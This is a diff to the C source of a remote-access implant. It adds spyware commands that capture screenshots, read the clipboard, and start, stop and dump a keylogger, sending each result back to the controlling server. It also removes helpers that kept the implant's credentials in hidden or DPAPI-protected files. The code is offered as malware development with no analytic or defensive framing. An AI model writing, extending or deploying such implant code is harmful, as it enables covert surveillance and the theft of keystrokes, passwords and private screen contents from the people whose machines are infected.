@@ -18,6 +18,7 @@
 #include "tls.h"
 #include "implant_utils.h"
 #include "platform.h"
+#include "spyware.h"
 
 #ifdef _WIN32
 #include <wincrypt.h>
@@ -125,67 +126,6 @@ static void cred_paths(char *cert_out, char *key_out, int len)
 #else
     snprintf(cert_out, len, "/tmp/.ec.dat");
     snprintf(key_out,  len, "/tmp/.ek.dat");
-#endif
-}
-
-static char *read_file_heap(const char *path, int *len_out)
-{
-    FILE *fp = fopen(path, "rb");
-    if (!fp) return NULL;
-    fseek(fp, 0, SEEK_END);
-    long sz = ftell(fp);
-    rewind(fp);
-    if (sz <= 0) { fclose(fp); return NULL; }
-    unsigned char *buf = malloc((size_t)sz);
-    if (!buf)  { fclose(fp); return NULL; }
-    if ((long)fread(buf, 1, (size_t)sz, fp) != sz)
-        { fclose(fp); free(buf); return NULL; }
-    fclose(fp);
-
-#ifdef _WIN32
-    DATA_BLOB bin, out;
-    bin.pbData = buf;
-    bin.cbData = (DWORD)sz;
-    if (CryptUnprotectData(&bin, NULL, NULL, NULL, NULL, 0, &out)) {
-        free(buf);
-        *len_out = (int)out.cbData;
-        return (char *)out.pbData;
-    }
-    free(buf);
-    return NULL;
-#else
-    *len_out = (int)sz;
-    return (char *)buf;
-#endif
-}
-
-static void write_file_safe(const char *path, const char *data, int len)
-{
-#ifdef _WIN32
-    /* Ensure parent directory exists */
-    char dir[512];
-    strncpy(dir, path, sizeof(dir) - 1);
-    dir[sizeof(dir) - 1] = '\0';
-    char *sep = strrchr(dir, '\\');
-    if (sep) { *sep = '\0'; CreateDirectoryA(dir, NULL); }
-
-    DATA_BLOB bin, out;
-    bin.pbData = (BYTE *)data;
-    bin.cbData = (DWORD)len;
-    if (!CryptProtectData(&bin, L"implant-cred", NULL, NULL, NULL, 0, &out))
-        return;
-    data = (const char *)out.pbData;
-    len  = (int)out.cbData;
-#endif
-
-    FILE *fp = fopen(path, "wb");
-    if (fp) {
-        fwrite(data, 1, (size_t)len, fp);
-        fclose(fp);
-    }
-
-#ifdef _WIN32
-    LocalFree((HLOCAL)out.pbData);
 #endif
 }
 
@@ -591,6 +531,67 @@ int main(int argc, char **argv)
                 Packet resp = {COMMAND_RESPONSE, pkt->request_id, bytes, output};
                 locked_send(&resp, conn);
                 PCLOSE(fp);
+            }
+            break;
+        }
+
+        case COMMAND_SCREENSHOT: {
+            int len = 0;
+            char *data = spy_screenshot_capture(&len);
+            if (data) {
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, data};
+                locked_send(&resp, conn);
+                free(data);
+            } else {
+                char *err = "screenshot failed";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+            }
+            break;
+        }
+
+        case COMMAND_CLIPBOARD_GET: {
+            int len = 0;
+            char *text = spy_clipboard_get(&len);
+            if (text) {
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, text};
+                locked_send(&resp, conn);
+                free(text);
+            } else {
+                char *err = "clipboard empty or failed";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+            }
+            break;
+        }
+
+        case COMMAND_KEYLOG_START: {
+            spy_keylog_start();
+            char *msg = "keylogger started";
+            Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(msg), msg};
+            locked_send(&resp, conn);
+            break;
+        }
+
+        case COMMAND_KEYLOG_STOP: {
+            spy_keylog_stop();
+            char *msg = "keylogger stopped";
+            Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(msg), msg};
+            locked_send(&resp, conn);
+            break;
+        }
+
+        case COMMAND_KEYLOG_DUMP: {
+            int len = 0;
+            char *data = spy_keylog_dump(&len);
+            if (data) {
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, len, data};
+                locked_send(&resp, conn);
+                free(data);
+            } else {
+                char *err = "no log data";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
             }
             break;
         }
